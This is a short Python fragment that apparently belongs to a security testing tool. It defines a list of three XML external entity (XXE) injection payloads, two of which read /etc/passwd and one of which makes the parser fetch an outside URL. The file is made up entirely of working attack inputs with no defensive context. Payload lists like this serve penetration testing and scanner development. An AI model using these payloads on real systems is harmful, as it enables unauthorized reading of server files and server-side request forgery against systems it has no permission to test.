XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [ 
         <!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "file:///etc/passwd" >
       ]>
       <foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [ 
         <!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "http://example.com" >
       ]>
       <foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ 
            <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
        ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>'''
]
